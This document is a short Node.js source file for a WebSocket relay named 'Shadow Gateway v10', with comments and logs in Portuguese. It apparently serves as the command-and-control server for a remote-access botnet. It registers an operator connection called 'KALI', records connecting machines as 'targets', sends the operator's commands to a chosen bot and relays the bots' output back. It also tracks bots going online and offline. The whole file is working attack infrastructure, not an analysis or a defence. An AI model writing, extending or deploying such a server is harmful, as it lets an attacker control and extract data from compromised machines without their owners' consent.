import { WebSocketServer, WebSocket } from 'ws';
import http from 'http';

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Shadow Gateway v10 - Online');
});

const wss = new WebSocketServer({ server });

let KALI = null;
const BOTS = new Map();

wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(req.url.split('?')[1]);
    const id = params.get('id');

    if (id === 'KALI') {
        if (KALI) KALI.terminate();
        KALI = ws;
        console.log('[+] Operador David Conectado');
        
        // Envia sinal de pronto para o Master.py ficar verde
        ws.send(JSON.stringify({ t: 'sys', msg: 'READY' }));

        BOTS.forEach((_, botId) => {
            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId }));
        });
    } else if (id) {
        if (BOTS.has(id)) BOTS.get(id).terminate();
        BOTS.set(id, ws);
        console.log(`[+] Alvo registrado: ${id}`);
        if (KALI && KALI.readyState === WebSocket.OPEN) {
            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
        }
    }

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (ws === KALI) {
                const target = BOTS.get(data.to);
                if (target) target.send(JSON.stringify(data.cmd));
            } else {
                if (KALI && KALI.readyState === WebSocket.OPEN) {
                    KALI.send(JSON.stringify({ t: 'res', f: id, d: data }));
                }
            }
        } catch (e) {
            if (ws !== KALI && KALI && KALI.readyState === WebSocket.OPEN) {
                KALI.send(JSON.stringify({ t: 'res', f: id, d: message.toString() }));
            }
        }
    });

    ws.on('close', () => {
        if (ws === KALI) {
            KALI = null;
            console.log('[-] Operador Desconectado');
        } else {
            BOTS.delete(id);
            if (KALI && KALI.readyState === WebSocket.OPEN) {
                KALI.send(JSON.stringify({ t: 'bot', s: 'off', id: id }));
            }
        }
    });

    const timer = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) ws.ping();
        else clearInterval(timer);
    }, 20000);
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
